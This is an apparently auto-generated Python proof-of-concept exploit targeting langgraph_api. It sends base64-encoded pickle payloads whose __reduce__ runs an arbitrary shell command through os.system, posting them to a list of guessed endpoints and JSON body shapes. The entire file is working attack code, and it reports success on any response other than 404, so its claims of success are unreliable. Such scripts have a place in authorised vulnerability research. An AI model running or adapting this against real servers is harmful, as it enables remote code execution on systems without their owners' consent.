#!/usr/bin/env python3
# PoC for langgraph_api (/home/xcy/.local/lib/python3.14/site-packages/langgraph_api)
# Path: rce-010
# Sink: loads_typed
# Auto-generated — run with: python3 rce_function_loads_typed_deserializes_loads_typed.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langgraph_api RCE via unsafe cloudpickle deserialization.

Vulnerability: The loads_typed() function in serde.py calls cloudpickle.loads()
on attacker-controlled data when pickle_fallback is True (default). This allows
arbitrary code execution during deserialization.

Usage:
    python3 poc.py [--target http://localhost:8000] [--command "id"]
"""

import argparse
import base64
import pickle
import os
import sys
import requests
import time

# Default target - change as needed
DEFAULT_TARGET = "http://localhost:8000"

def create_malicious_payload(command):
    """
    Create a pickled payload that executes the given command.
    Uses __reduce__ to execute os.system or subprocess.
    """
    class Exploit:
        def __reduce__(self):
            return (os.system, (command,))
    
    # Pickle the exploit object
    payload = pickle.dumps(Exploit())
    # Encode as base64 for transport
    return base64.b64encode(payload).decode()

def send_exploit(target, command):
    """
    Send the malicious payload to the vulnerable endpoint.
    The exact endpoint depends on how the API exposes loads_typed.
    Common endpoints might be /checkpoint, /state, or similar.
    """
    # Create the malicious payload
    payload_b64 = create_malicious_payload(command)
    
    # The vulnerable function expects data in format: ["pickle", <pickled_bytes>]
    # We need to find the right API endpoint that calls loads_typed
    # Common patterns in langgraph_api:
    # - POST /checkpoint with JSON body
    # - POST /state with JSON body
    # - POST /runs with JSON body
    
    # Try multiple potential endpoints
    endpoints = [
        "/checkpoint",
        "/state", 
        "/runs",
        "/api/checkpoint",
        "/api/state",
        "/api/runs",
    ]
    
    for endpoint in endpoints:
        url = f"{target}{endpoint}"
        print(f"[*] Trying endpoint: {url}")
        
        # The payload structure depends on how the API serializes data
        # Common format: {"data": ["pickle", "<base64_payload>"]}
        # Or: {"checkpoint": ["pickle", "<base64_payload>"]}
        
        payload_structures = [
            {"data": ["pickle", payload_b64]},
            {"checkpoint": ["pickle", payload_b64]},
            {"state": ["pickle", payload_b64]},
            {"serialized": ["pickle", payload_b64]},
        ]
        
        for payload_struct in payload_structures:
            try:
                print(f"[*] Trying payload structure: {payload_struct}")
                response = requests.post(
                    url,
                    json=payload_struct,
                    timeout=10,
                    headers={"Content-Type": "application/json"}
                )
                print(f"[*] Response status: {response.status_code}")
                print(f"[*] Response body: {response.text[:500]}")
                
                # If we get a 200 or 500 (not 404), the endpoint might be valid
                if response.status_code != 404:
                    print(f"[!] Potential hit on {url}")
                    return True
                    
            except requests.exceptions.ConnectionError:
                print(f"[-] Connection refused to {url}")
            except requests.exceptions.Timeout:
                print(f"[-] Timeout on {url}")
            except Exception as e:
                print(f"[-] Error: {e}")
    
    return False

def main():
    parser = argparse.ArgumentParser(description="PoC for langgraph_api RCE")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="Target URL")
    parser.add_argument("--command", default="touch /tmp/poc_success.txt", 
                       help="Command to execute (default: touch /tmp/poc_success.txt)")
    args = parser.parse_args()
    
    print(f"[*] Target: {args.target}")
    print(f"[*] Command: {args.command}")
    print("[*] Creating malicious payload...")
    
    # Test with a benign command first
    success = send_exploit(args.target, args.command)
    
    if success:
        print("[+] Exploit sent successfully!")
        print("[*] Check if the command was executed:")
        print(f"    {args.command}")
    else:
        print("[-] Could not find the correct endpoint.")
        print("[*] The vulnerability exists in the code, but the exact API endpoint")
        print("    depends on how the application exposes loads_typed().")
        print("[*] Try different endpoints or check the application's API documentation.")

if __name__ == "__main__":
    main()
